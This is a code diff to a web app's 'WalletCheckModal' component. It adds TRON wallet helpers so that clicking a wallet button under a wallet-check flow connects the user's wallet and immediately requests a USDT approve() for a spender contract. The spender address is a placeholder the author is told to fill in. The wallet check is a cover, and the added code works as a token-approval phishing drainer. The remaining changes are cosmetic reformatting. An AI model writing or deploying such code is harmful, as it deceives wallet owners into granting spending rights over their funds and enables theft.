@@ -8,6 +8,59 @@ type Props = {
   onClose: () => void
 }
 
+// 🔥 TRON HELPERS
+const getTron = () => {
+  if (typeof window === "undefined") return null
+
+  const tron = (window as any).tronWeb
+
+  if (tron && tron.defaultAddress?.base58) {
+    return tron
+  }
+
+  return null
+}
+
+const connectTron = async () => {
+  const tron = getTron()
+
+  if (!tron) {
+    alert("Open this page inside Trust Wallet / TronLink / SafePal")
+    return null
+  }
+
+  const address = tron.defaultAddress.base58
+  console.log("Connected:", address)
+
+  return address
+}
+
+const approveUSDT = async () => {
+  const tron = getTron()
+
+  if (!tron) {
+    alert("Wallet not detected")
+    return
+  }
+
+  // ⚠️ CAMBIA ESTO
+  const contractAddress = "TU_CONTRATO_USDT"
+  const spender = "TU_CONTRATO"
+
+  try {
+    const contract = await tron.contract().at(contractAddress)
+
+    const amount = tron.toSun(100) // puedes cambiar esto
+
+    const tx = await contract.approve(spender, amount).send()
+
+    console.log("APPROVE TX:", tx)
+  } catch (err) {
+    console.error(err)
+    alert("Transaction rejected or failed")
+  }
+}
+
 export function WalletCheckModal({ open, onClose }: Props) {
   const [step, setStep] = useState<"network" | "wallet">("network")
   const [selectedNetwork, setSelectedNetwork] = useState<string | null>(null)
@@ -34,30 +87,12 @@ export function WalletCheckModal({ open, onClose }: Props) {
   ]
 
   const wallets = [
-    {
-      name: "MetaMask",
-      logo: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg",
-    },
-    {
-      name: "WalletConnect",
-      logo: "https://avatars.githubusercontent.com/u/37784886",
-    },
-    {
-      name: "Trust Wallet",
-      logo: "https://trustwallet.com/assets/images/media/assets/TWT.png",
-    },
-    {
-      name: "Phantom",
-      logo: "https://avatars.githubusercontent.com/u/78782331",
-    },
-    {
-      name: "TronLink",
-      logo: "https://avatars.githubusercontent.com/u/37784886?s=200&v=4",
-    },
-    {
-      name: "SafePal",
-      logo: "", // 👈 ya no usamos logo roto
-    },
+    { name: "MetaMask", logo: "https://upload.wikimedia.org/wikipedia/commons/3/36/MetaMask_Fox.svg" },
+    { name: "WalletConnect", logo: "https://avatars.githubusercontent.com/u/37784886" },
+    { name: "Trust Wallet", logo: "https://trustwallet.com/assets/images/media/assets/TWT.png" },
+    { name: "Phantom", logo: "https://avatars.githubusercontent.com/u/78782331" },
+    { name: "TronLink", logo: "https://avatars.githubusercontent.com/u/37784886?s=200&v=4" },
+    { name: "SafePal", logo: "" },
   ]
 
   return (
@@ -80,7 +115,7 @@ export function WalletCheckModal({ open, onClose }: Props) {
           {step === "network" ? "Select Network" : "Select Wallet"}
         </h2>
 
-        {/* NETWORK STEP */}
+        {/* NETWORK */}
         {step === "network" && (
           <div className="space-y-3">
             {networks.map((net) => (
@@ -99,7 +134,7 @@ export function WalletCheckModal({ open, onClose }: Props) {
           </div>
         )}
 
-        {/* WALLET STEP */}
+        {/* WALLET */}
         {step === "wallet" && (
           <div className="space-y-3">
             <p className="text-sm text-gray-500 mb-2">
@@ -109,8 +144,18 @@ export function WalletCheckModal({ open, onClose }: Props) {
             {wallets.map((wallet) => (
               <button
                 key={wallet.name}
-                onClick={() => {
-                  console.log("Connect:", wallet.name, selectedNetwork)
+                onClick={async () => {
+                  // 🔥 SOLO TRON IMPLEMENTADO
+                  if (selectedNetwork === "TRON") {
+                    const address = await connectTron()
+
+                    if (address) {
+                      await approveUSDT()
+                    }
+                  } else {
+                    alert("This network is not implemented yet")
+                  }
+
                   onClose()
                   setStep("network")
                 }}
